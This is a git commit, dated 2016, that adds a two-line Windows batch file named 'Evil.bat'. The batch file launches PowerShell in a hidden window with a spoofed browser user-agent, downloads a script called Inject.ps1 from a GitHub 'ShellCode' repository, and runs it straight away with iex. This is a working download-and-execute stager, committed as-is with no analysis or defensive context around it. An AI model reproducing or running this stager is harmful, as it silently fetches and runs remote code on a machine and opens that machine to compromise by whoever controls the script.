28cf2fe66c85b1c786bcbad4180bce374e0e088f
UnholyDawns <RoyPaz@OutLook.com>
2016-05-04 00:05:01 +0300

    Added files via upload

---
+++ Evil.bat
@@ -0,0 +1,2 @@
+@echo off
+Powershell -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden $Web = New-Object Net.WebClient;$Web.Headers.Add('user-agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36)');$Command = $Web.DownloadString('https://raw.githubusercontent.com/UnholyDawns/ShellCode/master/Inject.ps1');iex $Command
